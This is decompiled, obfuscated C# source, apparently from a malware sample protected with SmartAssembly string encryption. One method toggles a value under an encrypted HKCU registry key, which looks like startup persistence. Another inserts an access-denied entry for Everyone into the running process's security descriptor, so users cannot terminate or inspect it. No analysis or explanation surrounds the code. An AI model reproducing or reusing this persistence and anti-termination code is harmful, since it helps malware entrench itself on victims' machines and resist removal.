using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace sWduCclqEzKrM;

internal sealed class uxNXrlnnpxw
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr vksBUwvyFGq, int RbzdEFIadihSsGhv, [Out] byte[] WKuTojexwAQ, uint sHRxlbXFjgyK, out uint xfDDGLDrOpls);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr vOSuDumHAL, int wyPnOSRxwgofs, [In] byte[] BtAGyDQURmvjVs);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void cWimzuuzJCxC(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(wJkbnIWOteHAMM.AJakXHzLGH(getString_0(107379833)));
			if (bool_0 && registryKey.GetValue(wJkbnIWOteHAMM.AJakXHzLGH(getString_0(107379728))) != null)
			{
				registryKey.DeleteValue(wJkbnIWOteHAMM.AJakXHzLGH(getString_0(107379728)));
			}
			else
			{
				registryKey.SetValue(wJkbnIWOteHAMM.AJakXHzLGH(getString_0(107379728)), getString_0(107396676));
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor hcUpByLDINcBM(IntPtr intptr_0)
	{
		byte[] wKuTojexwAQ = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, wKuTojexwAQ, 0u, out var xfDDGLDrOpls);
		if ((long)xfDDGLDrOpls > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, wKuTojexwAQ = new byte[xfDDGLDrOpls], xfDDGLDrOpls, out xfDDGLDrOpls))
		{
			return null;
		}
		return new RawSecurityDescriptor(wKuTojexwAQ, 0);
	}

	private void BMxgTfKYapV(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void aXczjuKTuSPGGf()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = hcUpByLDINcBM(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			BMxgTfKYapV(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static uxNXrlnnpxw()
	{
		Strings.CreateGetStringDelegate(typeof(uxNXrlnnpxw));
	}
}
